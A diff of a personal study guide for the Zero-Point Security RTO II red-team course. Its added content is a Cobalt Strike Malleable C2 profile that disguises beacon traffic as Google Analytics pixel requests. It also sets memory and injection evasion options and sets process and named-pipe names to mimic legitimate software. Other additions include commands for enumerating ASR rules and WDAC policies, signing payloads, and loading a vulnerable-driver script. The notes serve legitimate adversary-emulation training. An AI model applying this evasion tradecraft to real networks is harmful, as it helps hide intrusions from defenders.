@@ -1,6 +1,5 @@
 # Zero-Point Security Red Team Operations (RTO) II
-All the concepts from the course as well as my own research, with commands provided where relevant
-
+All the concepts from the course as well as my own research, with commands provided
 ***DO NOT USE THIS DOCUMENT AS IS***
 1. download this markdown file, and open it in [Obisidan](https://obsidian.md)
 2. in Settings → Core Plugins, enable Outline, then run "Outline: Show Outline" in the command palette
@@ -8,7 +7,7 @@ All the concepts from the course as well as my own research, with commands provi
 3. in Settings → Community plugins → Browse, find and install "Copy Inline Code"
      - Now you can copy any command by clicking on the end of it.
 4. enter "reading" view by clicking the book in the top-right (by default)
-     - Now you can see the contents of linked sections by hovering over them.
+     - Now you can see commands for linked sections by hovering over them.
 ## C2 Infrastructure
 #### Apache Installation
 on redirector,
@@ -117,7 +116,7 @@ RewriteCond %{REQUEST_URI} a|b|c|d
 RewriteRule ^.*$ https://localhost:8443%{REQUEST_URI} [P,L]
 ```
 #### SSH Tunnel
-##### HTTP
+##### HTTPS
 on attacker (client),
 `scp localhost.crt attacker@[redirector]:/home/attacker/`
 
@@ -257,10 +256,13 @@ Spoof thread stack using Fibers:
 `//#include "evasive_sleep.c"`
 `#include "evasive_sleep_stack_spoof.c"`
 2. evasive_sleep_stack_spoof.c
-	1. find a legitimate call stack to reproduce (eg. msedge.exe) - must begin with **NtWaitForSingleObject**
+    1. find a legitimate call stack to reproduce (eg. msedge.exe) - must begin with **NtWaitForSingleObject**
 	2. for each call: `getFunctionOffset.exe [dll] [function] [offset]`
 	3. copy generated code to **set_callstack** function
 `#define CFG_BYPASS 1`
+3. ensure profile stage:
+    - contains `set userwx "true";`
+    - does *not* contain `set obfuscate "true";`
 ##### Syscalls (bypass API Hooks)
 Syscalls are used to avoid API hooks on functions in DLLs
 
@@ -297,66 +299,127 @@ Build the **Arsenal Kit → Artifact Kit**, specifying the syscalls option
 on attacker (server),
 `nano /home/attacker/cobaltstrike/c2-profiles/custom/custom.profile`
 ```
-set sleeptime "5";
 set tasks_max_size "2097152";
-
-# C2 Infrastructure -> Beacon Staging
 set host_stage "false";
+set sleeptime "10000";
 
-# C2 Infrastructure -> Beacon Certificates
-https-certificate {
-	set keystore "localhost.store";
-	set password "pass123";
+http-get {
+        set uri "/__utm.gif";
+        client {
+                parameter "utmac" "UA-2202604-2";
+                parameter "utmcn" "1";
+                parameter "utmcs" "ISO-8859-1";
+                parameter "utmsr" "1280x1024";
+                parameter "utmsc" "32-bit";
+                parameter "utmul" "en-US";
+				
+                metadata {
+                        netbios;
+                        prepend "SESSIONID=";
+                        header "Cookie";
+                }
+        }
+		
+        server {
+                header "Content-Type" "image/gif";
+				
+                output {
+                        # hexdump pixel.gif
+                        # 0000000 47 49 46 38 39 61 01 00 01 00 80 00 00 00 00 00
+                        # 0000010 ff ff ff 21 f9 04 01 00 00 00 00 2c 00 00 00 00
+                        # 0000020 01 00 01 00 00 02 01 44 00 3b
+						
+                        prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
+                        prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
+                        prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
+						
+                        print;
+                }
+        }
 }
 
-# C2 Infrastructure -> Cookie Rules
-metadata {
-	netbios;
-	prepend "SESSIONID=";
-	header "Cookie";
+http-post {
+        set uri "/___utm.gif";
+        client {
+                header "Content-Type" "application/octet-stream";
+				
+                id {
+                        prepend "UA-220";
+                        append "-2";
+                        parameter "utmac";
+                }
+				
+                parameter "utmcn" "1";
+                parameter "utmcs" "ISO-8859-1";
+                parameter "utmsr" "1280x1024";
+                parameter "utmsc" "32-bit";
+                parameter "utmul" "en-US";
+				
+                output {
+                        print;
+                }
+        }
+		
+        server {
+                header "Content-Type" "image/gif";
+				
+                output {
+                        prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
+                        prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
+                        prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
+                        print;
+                }
+        }
+}
+
+https-certificate {
+        set keystore "localhost.store";
+        set password "pass123";
 }
 
 stage {
-	# EDR Evasion -> Sleep Mask Kit
-	set sleep_mask "true";
-	
-	# Defence Evasion -> Memory Permissions & Cleanup
-	set userwx "false";
-	set cleanup "true";
-	
-	# Recommended Reading (above)
-	set obfuscate "true";
-	set magic_pe "TL";
-	set magic_mz_x64 "AYAQ";
-	
-	transform-x64 {
-		prepend "\x44\x40\x4B\x43\x4C\x48\x90\x66\x90\x0F\x1F\x00\x66\x0F\x1F\x04\x00\x0F\x1F\x04\x00\x0F\x1F\x00\x0F\x1F\x00";
-		strrep "(admin)" "(adm1n)";
-		strrep "%s as %s\\%s: %d" "%s - %s\\%s: %d";
-		strrep "\x25\xff\xff\xff\x00\x3D\x41\x41\x41\x00" "\xB8\x41\x41\x41\x00\x3D\x41\x41\x41\x00";
-	}
+        # EDR Evasion -> Sleep Mask Kit
+        set sleep_mask "true";
+		
+        # Defence Evasion -> Memory Permissions & Cleanup
+        set cleanup "true";
+		
+		# mask text section during sleep (see sleep mask kit -> mask_text_section.c)
+        set userwx "true";
+        
+		# not compatible with sleep mask kit
+        #set obfuscate "true";
+        set magic_pe "TL";
+        set magic_mz_x64 "AYAQ";
+		
+        transform-x64 {
+                prepend "\x44\x40\x4B\x43\x4C\x48\x90\x66\x90\x0F\x1F\x00\x66\x0F\x1F\x04\x00\x0F\x1F\x04\x00\x0F\x1F\x00\x0F\x1F\x00";
+                strrep "(admin)" "(adm1n)";
+                strrep "%s as %s\\%s: %d" "%s - %s\\%s: %d";
+                strrep "\x25\xff\xff\xff\x00\x3D\x41\x41\x41\x00" "\xB8\x41\x41\x41\x00\x3D\x41\x41\x41\x00";
+                # strrep "\x4D\x5A\x41\x52\x55\x48\x89\xE5\x48\x81\xEC\x20\x00\x00\x00\x48\x8D\x1D\xEA\xFF\xFF\xFF\x48\x89\xDF\x48\x81\xC3\xD4\x88\x01\x00\xFF\xD3\x41\xB8\xF0\xB5\xA2\x56\x68\x04\x00\x00\x00\x5A\x48\x89\xF9\xFF\xD0" "\x4D\x5A\x48\x8D\x1D\xF8\xFF\xFF\xFF\x41\x52\x48\x83\xEC\x28\x48\x89\xDF\x48\x81\xC3\x52\xB7\x00\x00\x48\x81\xC3\x52\xB7\x00\x00\xFF\xD3\x48\xC7\xC2\x04\x00\x00\x00\x48\x89\xF9\xFF\xD0";
+        }
 }
 
-# Defence Evasion -> BOF Memory Allocations
 process-inject {
-	set startrwx "false";
-	set userwx "false";
-	set bof_reuse_memory "false";
+        set startrwx "false";
+        set userwx "false";
+        set bof_reuse_memory "false";
+        set allocator "NtMapViewOfSection";
 }
 
-# Defence Evasion
 post-ex {
-	# Fork and Run Memory Allocations
-	set obfuscate "true";
-	set cleanup "true";
-	
-	# SpawnTo
-	set spawnto_x86 "c:\\windows\\syswow64\\notepad.exe";
-	set spawnto_x64 "c:\\windows\\sysnative\\notepad.exe";
-	
-	# SMB Named Pipes Names
-	# include pound (#) for random hex digit
-	set pipename "[pipe1], [pipe2], [...]";
+        # Fork and Run Memory Allocations
+        set obfuscate "true";
+        set cleanup "true";
+		
+        # SpawnTo
+        set spawnto_x86 "c:\\windows\\syswow64\\cmd.exe";
+        set spawnto_x64 "C:\\program files (x86)\\microsoft\\edge\\application\\msedge.exe";
+		
+        # SMB Named Pipes Names
+        # include pound (#) for random hex digit
+        set pipename "TSVCPIPE-########-####-####-####-############";
 }
 ```
 `cd ~/cobaltstrike`
@@ -364,10 +427,11 @@ check for errors: `./c2lint c2-profiles/custom/custom.profile`
 #### Aggressor Scripts
 `C:\Tools\cobaltstrike\process-inject\processinject.cna`
 powerpick and execute-assembly etw bypass
-`C:\Tools\InlineExecute-Assembly\inlineExecute-Assembly.cna`
+`C:\Tools\InlineExecute-Assembly\inlineExecute-Assembly\inlineExecute-Assembly.cna`
 `C:\Tools\RedOctober\RedOctober.cna`
+`C:\Tools\cobaltstrike\gdrv\gdrv.cna`
 `C:\Tools\cobaltstrike\ppenum\ppenum.cna`
-`C:\Tools\cobaltstrike\arsenal-kit\kits\mutator\sleepmask_mutator.cna`
+`C:\Tools\cobaltstrike\sleepmask\sleepmask.cna`
 #### Payload Guardrails
 when creating a listener, to the right of Guardrails, click `...`
 **Examples**
@@ -469,7 +533,8 @@ Types of exclusions:
 - custom exclusions - usually defined in GPO
 #### Enumerating Enabled Rules
 In registry
-`reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR\ExploitGuard_ASR_Rules"`
+command line: `reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR\ExploitGuard_ASR_Rules"`
+beacon: `reg queryv x64 HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR ExploitGuard_ASR_Rules`
 - 0 ⇒ disabled
 - 1 ⇒ enabled
 rules in `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR\Rules`
@@ -615,7 +680,7 @@ In GPO
 **ValueData** is the p7b file containing the WDAC rules
 `download [path]`
 #### Reversing WDAC Rules
-`impo C:\Tools\CIPolicyParser.ps1`
+`ipmo C:\Tools\CIPolicyParser.ps1`
 `ConvertTo-CIPolicy -BinaryFilePath .\CIPolicy.p7b -XmlFilePath CIPolicy.xml`
 open `CIPolicy.xml`
 #### Trusted Signers
@@ -666,7 +731,7 @@ Export to PFX
 get certificate ID with `certutil -user -store My`
 `certutil -user -exportpfx -privatekey -p [password] My [id] cert.pfx`
 
-Sign Binary
+Sign Binary (Visual Studio developer prompt)
 `signtool sign /f cert.pfx /p [password] /fd SHA256 [binary]`
 ##### Sign Cobalt Strike Payloads
 on attacker,
@@ -742,11 +807,11 @@ For release, check the cna files in in the bin folder
 `cd C:\Tools\cobaltstrike\arsenal-kit\kits\udrl-vs\bin\default-loader`
 ## Misc
 #### Read GPO
-`powerpick Get-DomainGPO -Properties DisplayName | sort -Property DisplayName | select displayname, gpcfilesyspath`
+`powerpick Get-DomainGPO -Properties DisplayName,gpcfilesyspath | sort -Property DisplayName`
 
 `gc "[gpcfilesyspath]\Machine\Registry.pol"`
 or
-`download \\[gpcfilesyspath]\Machine\Registry.pol`
+`download [gpcfilesyspath]\Machine\Registry.pol`
 `Install-Module -Name GPRegistryPolicyParser`
 `Parse-PolFile -Path Registry.pol`
 #### Load Kernel Driver
